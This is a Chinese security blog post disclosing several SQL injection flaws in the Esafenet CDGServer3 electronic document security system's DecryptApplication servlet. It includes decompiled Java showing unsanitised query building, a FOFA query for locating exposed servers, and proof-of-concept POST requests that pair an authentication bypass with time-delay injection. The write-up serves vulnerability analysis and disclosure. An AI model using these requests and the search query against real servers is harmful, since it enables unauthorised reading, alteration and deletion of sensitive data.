---
title: "亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞"
source: https://mrxn.net/jswz/CDGServer3-client-DecryptApplication-sqli.html
asset_dir: assets/亿赛通-电子文档安全管理系统-decryptapplication-多处sql注入漏洞
---

# 亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/9/1 09:49
- 716浏览
- [0评论](#comment)
- 2小时阅读

深入探索

client

软件

计算机安全

---

# 漏洞简介

亿赛通电子文档安全管理系统的DecryptApplication接口存在SQL注入漏洞。攻击者可以通过构造特定的POST请求，在flowId参数中注入恶意SQL代码，利用该漏洞对数据库执行任意SQL操作。攻击者可以通过注入WAITFOR DELAY命令，导致数据库响应时间延迟，从而确认[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)的成功。此漏洞可能导致数据库中的敏感信息泄露、篡改或删除，严重威胁系统的安全性和数据完整性。

安全研究工具

# 影响版本

# fofa语法

> app="亿赛通-电子文档安全管理系统" || body="/CDGServer3/index.jsp"

# 漏洞分析

PS: 相关权限绕过简析参考[亿赛通电子文档安全管理系统 AppExamList.jsp SQL注入漏洞](https://mrxn.net/jswz/esafenet-AppExamList-sqli.html)

根据 web.xml 里对 `DecryptApplication` 的定义

```
<!-- DecryptApplication -->
<servlet>
    <servlet-name>DecryptApplication</servlet-name>
    <display-name>DecryptApplication</display-name>
    <servlet-class>
       com.esafenet.servlet.client.DecryptApplicationService
    </servlet-class>
</servlet>

<servlet-mapping>
    <servlet-name>DecryptApplication</servlet-name>
    <url-pattern>/client/DecryptApplication</url-pattern>
</servlet-mapping>
```

深入探索

防火墙软件

文本剥离工具

漏洞扫描器

可知，访问路由为 /client/DecryptApplication ，具体实现逻辑类为 `com.esafenet.servlet.client.DecryptApplicationService`

## delDecryptApplication

跟进查看`delDecryptApplication`实现方式

SQL注入防护

```
public void actionDelDecryptApplication(HttpServletRequest req, HttpServletResponse res) throws IOException, ServletException, Exception {
    String fromurl = RequestUtil.getParameter(req, "fromurl", "");
    String id = RequestUtil.getParameter(req, "id", "");
    this.model.delDecryptApplication(id);
    if (CDGUtil.isGF()) {
        res.sendRedirect(fromurl);
    } else {
        req.getRequestDispatcher(fromurl).forward(req, res);
    }

}
```

将请求的参数如`id`带入`delDecryptApplication`方法

```
public void delDecryptApplication(String id) throws Exception {
    Map setMap = new HashMap();
    Map updateMap = new HashMap();
    setMap.put("HasDeleted", "1");
    setMap.put("Field02", CDGUtil.getCurrentTime());
    updateMap.put("uniqueid", id);
    this.decryptApplicationDao.update(setMap, updateMap);
}
```

继续跟进`decryptApplicationDao.update`方法

深入探索

授权

技术文章订阅

安全研究报告

```
public void update(Map setM, Map updateM) throws Exception {
    StringBuffer toSetSb = new StringBuffer(" ");
    StringBuffer updateSb = new StringBuffer(" ");
    Set setMap = setM.entrySet();
    Set updateMap = updateM.entrySet();
    if (setMap != null && updateMap != null && setMap.size() != 0 && updateMap.size() != 0) {
        Iterator iter = setMap.iterator();

        while(iter.hasNext()) {
            Map.Entry element = (Map.Entry)iter.next();
            if (iter.hasNext()) {
                toSetSb.append(element.getKey().toString()).append("=").append("'").append(this.verifyString(element).toString()).append("',");
            } else {
                toSetSb.append(element.getKey().toString()).append("=").append("'").append(this.verifyString(element).toString()).append("' ");
            }
        }

        iter = updateMap.iterator();

        while(iter.hasNext()) {
            Map.Entry element = (Map.Entry)iter.next();
            if (iter.hasNext()) {
                updateSb.append(element.getKey().toString()).append("=").append("'").append(this.verifyString(element).toString()).append("' and ");
            } else {
                updateSb.append(element.getKey().toString()).append("=").append("'").append(this.verifyString(element).toString()).append("' ");
            }
        }

        String sql = "update " + tableName + " SET " + toSetSb.toString() + " where " + updateSb.toString();
        this.updateCommon(sql);
    }
```

主要为组装sql语句后直接执行，可见参数全程未经任何过滤和校验就被直接拼接进sql语句中进行执行，从而导致[sql注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

## DownLoadLogs

```
public void actionDownLoadLogs(HttpServletRequest req, HttpServletResponse res) throws IOException, ServletException, Exception {
    String isdeled = RequestUtil.getParameter(req, "isdeled", "");
    String isExam = RequestUtil.getParameter(req, "isExam", "");
    String type = "解密申请";
    this.model.downLoadLogs(isdeled, isExam, req, res, type);
}
```

跟进`downLoadLogs`方法

```
public void downLoadLogs(String isdeled, String isExam, HttpServletRequest req, HttpServletResponse res, String type) throws IOException {
    String ip = RequestUtil.getParameter(req, "ip", "");
    String machineName = RequestUtil.getParameter(req, "machineName", "");
    res.setContentType("csv");
    res.setHeader("Content-Disposition", "attachment;filename=\"log.csv\"");
    res.setContentType("text/plain;charset=GB2312");
    PrintWriter out = null;

    try {
        out = res.getWriter();
        out.println("客户端,申请人,类型,审批人,审批日期,备注,申请时间");
        List<DecryptApplicationInfo> list = getLogs(isdeled, isExam, ip, machineName);
```

跟进`getLogs`方法

```
private static List<DecryptApplicationInfo> getLogs(String isdeled, String isExam, String ip, String machineName) throws Exception {
    DecryptApplicationDao dao = new DecryptApplicationDao();
    Map map = new HashMap();
    map.put("HasDeleted", isdeled);
    if (!"".equals(isExam)) {
        map.put("HasExam", isExam);
    }

    if (!"".equals(ip)) {
        map.put("Ip", ip);
    }

    if (!"".equals(machineName)) {
        map.put("MachineName", machineName);
    }

    return dao.getList(map);
}
```

继续跟进`getList`方法

```
public List<DecryptApplicationInfo> getList(Map map) throws Exception {
    List<DecryptApplicationInfo> list = new ArrayList();
    StringBuffer sql = new StringBuffer();
    sql.append("select * from " + tableName);
    String where = CDGUtil.getWhereClauseForString(map);
    sql.append(where);
    HashMap[] maps = this.getCommonResults(sql.toString());
    if (maps != null && maps.length > 0) {
        for(int i = 0; i < maps.length; ++i) {
            list.add(MapToInfo(maps[i]));
        }
    }

    return list;
}
```

喏，又是和前面一样的组装完成sql语句后直接执行，全程无过滤或校验，从而造成[sql注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

## DelAllDecryptApplication

```
public void actionDelAllDecryptApplication(HttpServletRequest req, HttpServletResponse res) throws IOException, ServletException, Exception {
    String fromurl = RequestUtil.getParameter(req, "fromurl", "");
    String[] strs = RequestUtil.getParameters(req, "allCheckbox");

    for(int i = 0; strs != null && i < strs.length; ++i) {
        this.model.delDecryptApplication(strs[i]);
    }

    req.getRequestDispatcher(fromurl).forward(req, res);
}
```

跟进delDecryptApplication方法

代码安全审计

```
public void delDecryptApplication(String id) throws Exception {
    Map setMap = new HashMap();
    Map updateMap = new HashMap();
    setMap.put("HasDeleted", "1");
    setMap.put("Field02", CDGUtil.getCurrentTime());
    updateMap.put("uniqueid", id);
    this.decryptApplicationDao.update(setMap, updateMap);
}
```

又遇见熟悉的`decryptApplicationDao.update`方法了，在上面已经分析过了，这里就不赘述了。

## PassDecryptApplication

```
public void actionPassDecryptApplication(HttpServletRequest req, HttpServletResponse res) throws IOException, ServletException, Exception {
    log.info("执行审批通过业务:" + CDGUtil.getTime());
    String fromurl = RequestUtil.getParameter(req, "fromurl", "");
    String id = RequestUtil.getParameter(req, "id", "");
    String uploadFile = RequestUtil.getParameter(req, "uploadFile", "");
    DecryptApplicationInfo info = this.model.findById(id);
```

跟进 `findById` 方法

```
public DecryptApplicationInfo findById(String id) throws Exception {
    StringBuffer sql = new StringBuffer();
    sql.append("select * from " + tableName);
    Map<String, String> map = new HashMap();
    map.put("Uniqueid", id);
    String where = CDGUtil.getWhereClauseForString(map);
    sql.append(where);
    HashMap[] maps = this.getCommonResults(sql.toString());
    if (maps != null && maps.length > 0) {
        DecryptApplicationInfo info = MapToInfo(maps[0]);
        return info;
    } else {
        return null;
    }
}
```

也是熟悉的方法组装sql语句后执行，造成[sql注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

## OpposeDecryptApplication

[![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](images/img-001-205a3ff32b65.webp)](https://image.mrxn.net/4338b3847b03437bb31de694830cdd9a.webp)

和上面的一样

漏洞预警服务

## Examing

```
public void actionExaming(HttpServletRequest req, HttpServletResponse res) throws IOException, ServletException, Exception {
    String fromurl = RequestUtil.getParameter(req, "fromurl", "");
    String appId = RequestUtil.getParameter(req, "appId", "");

    try {
        this.model.changeSome(appId, req);
```

跟进`changeSome`方法

```
public void changeSome(String appId, HttpServletRequest req) throws Exception {
    List<DecryptFileVO> decryptFiles = this.getPassFileForAppId(appId);
    String appUser = req.getParameter("appUser");
    this.examApplication_1_Socket(1, decryptFiles, appUser);
    this.examApplication_2_Db(req, appId, decryptFiles, "", "");
}

private List<DecryptFileVO> getPassFileForAppId(String appId) throws Exception {
    Map map = new HashMap();
    map.put("DecryptApplicationId", appId);
    map.put("IsApproval", new Integer(1));
    List<DecryptFileInfo> list = this.decryptFileDao.findByPrecise(map);
```

跟进`findByPrecise`方法

```
public List<DecryptFileInfo> findByPrecise(Map map) throws Exception {
    StringBuffer sql = new StringBuffer();
    sql.append("select * from " + tableName);
    sql.append(CDGUtil.getWhereClauseForString(map));
    HashMap[] maps = this.getCommonResults(sql.toString());
```

同样也是组装sql语句后执行，造成[sql注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

## UpLoadDecyptFile

[![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](images/img-002-b02b5927624a.webp)](https://image.mrxn.net/8a24004dce5642639cf97e564f176a20.webp)

[![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](images/img-003-1d2120ccd846.webp)](https://image.mrxn.net/d1bb1e7ba41f446e86eede337c7cb681.webp)

[![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](images/img-004-f510bd153ffe.webp)](https://image.mrxn.net/000df6495a464dedaacfaa37d04ed3c3.webp)

## DelDecyptFile

[![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](images/img-005-3cb80070af5d.webp)](https://image.mrxn.net/12d3543776e54a79853fb094066496c2.webp)

[![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](images/img-006-c6b4edf9a93f.webp)](https://image.mrxn.net/8dce46f3814b4e1bafed3e9c767ebc77.webp)

## PassDecryptApplication1

[![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](images/img-007-c353c170d8e0.webp)](https://image.mrxn.net/278f3a97f0964081b93f06a73a96e703.webp)

[![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](images/img-008-4188d41cc7d7.webp)](https://image.mrxn.net/ac84a50bd52d41eb84632cd088862302.webp)

## DelDecryptApplication2

[![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](images/img-009-35e25de73c22.webp)](https://image.mrxn.net/0d18a0a1ca094e6989bd4d7791037fb4.webp)

[![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](images/img-010-5a809fe4e84e.webp)](https://image.mrxn.net/be8b8b2500614c9a9f7359a48bfc00a4.webp)

## OpposeDecryptApplication2

[![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](images/img-011-83998784b371.webp)](https://image.mrxn.net/5119a19630c342f696861a5cfa9216d9.webp)

[![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](images/img-012-5f5b8ffaddcc.webp)](https://image.mrxn.net/ebaf2415880a4a00a8e21da8e7841ca3.webp)

## DelAllDecryptApplication2

[![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](images/img-013-76adbcab8370.webp)](https://image.mrxn.net/4eaa007ca5104e4b87a710b5dcbf60ea.webp)

# 漏洞复现

## DelDecryptApplication

```
POST /CDGServer3/client/DecryptApplication;Servicelogin HTTP/1.1
Host: CDGServer3.mrxn.net
Content-Type: application/x-www-form-urlencoded

id=SQLI_POC&machineId=&command=DelDecryptApplication&fromurl=/frame.jsp&appUser=
```

[![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](images/img-014-11cca562cb00.webp)](https://image.mrxn.net/9bfc1c58a1374de7ab0c5537a0f28629.webp)

成功延时 5 秒

编程

## DownLoadLogs

```
POST /CDGServer3/client/DecryptApplication;Servicelogin HTTP/1.1
Host: CDGServer3.mrxn.net
Content-Type: application/x-www-form-urlencoded

isdeled=SQLI_POC&isExam=&command=DownLoadLogs
```

[![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](images/img-015-37f059e0bbf5.webp)](https://image.mrxn.net/f55bf75cc4304ba5959ab663fb261e5d.webp)

成功延时 5 秒

数据管理

## DelAllDecryptApplication

```
POST /CDGServer3/client/DecryptApplication;Servicelogin HTTP/1.1
Host: CDGServer3.mrxn.net
Content-Type: application/x-www-form-urlencoded

allCheckbox=SQLI_POC&fromurl=DeletedDecryptApplication2.jsp&command=DelAllDecryptApplication
```

[![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](images/img-016-6ba300db83dc.webp)](https://image.mrxn.net/3a56803602b147e1b161e270619ab97f.webp)

成功延时 5 秒

安全研究工具

## PassDecryptApplication

```
POST /CDGServer3/client/DecryptApplication;Servicelogin HTTP/1.1
Host: CDGServer3.mrxn.net
Content-Type: application/x-www-form-urlencoded

id=SQLI_POC&fromurl=UnChkDecryptAppliction.jsp;jsessionid=E3D7E1E37FB207B0B1E1370638516643&command=PassDecryptApplication&uploadFile=1
```

[![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](images/img-017-5a45c7ca319a.webp)](https://image.mrxn.net/514be14711ff4a6ebac12f6e106008a5.webp)

## OpposeDecryptApplication

[![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](images/img-018-0831b50d03a8.webp)](https://image.mrxn.net/44d522d1d0e74a59bba2ef5e0ec26434.webp)

## Examing

[![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](images/img-019-2abc4c2f6619.webp)](https://image.mrxn.net/f348f76e363f49f2902de1b0a7dffe80.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [4.1.delDecryptApplication](#toc-4-1-)
- [4.2.DownLoadLogs](#toc-4-2-)
- [4.3.DelAllDecryptApplication](#toc-4-3-)
- [4.4.PassDecryptApplication](#toc-4-4-)
- [4.5.OpposeDecryptApplication](#toc-4-5-)
- [4.6.Examing](#toc-4-6-)
- [4.7.UpLoadDecyptFile](#toc-4-7-)
- [4.8.DelDecyptFile](#toc-4-8-)
- [4.9.PassDecryptApplication1](#toc-4-9-)
- [4.10.DelDecryptApplication2](#toc-4-10-)
- [4.11.OpposeDecryptApplication2](#toc-4-11-)
- [4.12.DelAllDecryptApplication2](#toc-4-12-)
- [5.漏洞复现](#toc-5-)
- [5.1.DelDecryptApplication](#toc-5-1-)
- [5.2.DownLoadLogs](#toc-5-2-)
- [5.3.DelAllDecryptApplication](#toc-5-3-)
- [5.4.PassDecryptApplication](#toc-5-4-)
- [5.5.OpposeDecryptApplication](#toc-5-5-)
- [5.6.Examing](#toc-5-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
